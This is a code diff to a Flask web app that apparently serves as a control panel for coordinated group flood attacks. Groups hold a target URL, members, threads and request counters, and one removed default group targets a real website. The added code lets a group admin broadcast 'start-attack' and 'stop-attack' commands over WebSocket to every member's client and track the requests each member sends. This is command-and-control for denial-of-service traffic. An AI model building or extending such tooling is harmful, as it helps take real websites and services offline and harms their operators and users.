@@ -1,13 +1,14 @@
 from flask import Blueprint, request, render_template, redirect
 from flask import g as session
 
-from group import Group, Member
+from group import Group, Member, find_user, find_group, groups
 import string
+import json
+
+from ws.client import WebSocketClient
 
 group = Blueprint('groups_blueprint', __name__, url_prefix='/group/')
 ok_chars = string.ascii_letters + string.digits + '_-'
-
-groups = [Group('Anonimous', 'https://google.com', 'admin', 10, [Member('test', 3, 5), Member('traba2', 3, 5)], [], 2)]
 
 def check_group_name(name):
     if len(name) > 22 or len(name) < 2:
@@ -15,21 +16,24 @@ def check_group_name(name):
 
     return all([char in ok_chars for char in name])
 
-def find_group(name):
-    for group in groups:
-        if group.name == name:
-            return group
-    return None
-
-def find_user(group, name):
-    for user in group.members:
-        if user.name == name:
-            return user
-    return None
-
 @group.route('/json')
 def groups_list_json():
     return {g.name: {'target': g.target, 'members_count': g.members_count, 'threads': g.threads} for g in groups}
+
+@group.route('/<name>/json')
+def group_json(name):
+    group = find_group(name)
+    if not group:
+        return render_template('404.html', msg='Group not found'), 404
+
+    if session.user in group.banned:
+        return render_template('404.html', msg='Group not found'), 404
+
+    members = {}
+    for member in group.members:
+        members[member.name] = member.requests_total
+
+    return {'per_second': group.requests_per_second, 'total': group.requests_total, 'members': members}
 
 @group.route('/<name>')
 def group_info(name):
@@ -73,6 +77,10 @@ def start_attack(name):
     if session.user != group.admin:
         return render_template('401.html', msg='You\'re not the Group Admin'), 401
 
+    for member in group.members:
+        client = WebSocketClient.connections[member.name]
+        client.ws.send(json.dumps({'p': 'start-attack'}))
+
     group.status = 'RUNNING'
 
     return redirect(f'/group/{name}')
@@ -86,7 +94,16 @@ def stop_attack(name):
     if session.user != group.admin:
         return render_template('401.html', msg='You\'re not the Group Admin'), 401
 
+    for member in group.members:
+        client = WebSocketClient.connections[member.name]
+        client.ws.send(json.dumps({'p': 'stop-attack'}))
+
+        member.requests_per_second = 0
+        member.requests_total = 0
+
     group.status = 'idle'
+    group.requests_per_second = 0
+    group.requests_total = 0
 
     return redirect(f'/group/{name}')
 
